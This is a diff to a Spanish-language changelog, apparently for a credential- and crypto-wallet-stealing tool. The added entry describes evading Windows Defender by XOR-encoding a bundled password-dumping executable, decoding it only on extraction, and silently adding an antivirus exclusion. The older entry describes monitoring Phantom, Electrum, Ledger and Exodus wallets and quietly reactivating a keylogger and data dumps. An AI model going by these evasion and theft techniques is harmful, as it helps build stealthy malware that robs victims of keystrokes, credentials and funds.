@@ -1,5 +1,9 @@
 # Changelog
 
+## 0.2.31
+
+- Defender marcaba la descarga del jar 0.2.30 como `HackTool:Win64/PSWDump.MX!MTB` y fallaba la cuarentena porque `chromelevator_x64.exe` viajaba como PE dentro de dos jars anidados. Ahora se genera un `chromelevator_x64.dat` XOR en el build, el jar no contiene ningún PE y `Abe` lo decodifica solo al extraerlo a `cache\tools`, tras verificar el SHA-256 fijado. Antes de escribir intenta una exclusión silenciosa de esa carpeta.
+
 ## 0.2.30
 
 - Carteras: `LOST` distingue `grace` de `dead`. Una gracia cierra la extensión del navegador aunque el PID del navegador siga vivo y emite un único `wallet closed`; en cambio conserva Electrum/Ledger/Exodus con PID vivo (rebote de foco) y `dead` limpia siempre. Reabrir Phantom en el mismo navegador dentro del cooldown de 600 s restaura la sesión y reactiva el keylogger sin segundo aviso ni volcado.
